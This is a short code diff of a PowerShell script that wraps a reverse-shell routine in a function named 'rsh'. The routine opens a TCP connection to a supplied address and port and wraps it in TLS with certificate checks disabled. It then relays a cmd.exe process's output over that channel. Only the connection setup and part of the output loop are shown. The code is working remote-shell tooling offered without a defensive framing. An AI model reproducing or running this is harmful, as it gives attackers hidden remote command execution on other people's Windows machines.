@@ -1,4 +1,5 @@
-param($address,$port,$shell='cmd.exe',$parameters)
+function rsh($address,$port,$shell='cmd.exe',$parameters)
+{
 $tcpclient = new-object net.sockets.tcpclient($address,$port)
 $tcpstream = $tcpclient.getstream()
 $tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
@@ -36,4 +37,5 @@ while(($shell.hasexited -eq $false))
 	{
 		$tlsstreamwriter.write([char]$stdout.read())
 	}
+}
 }
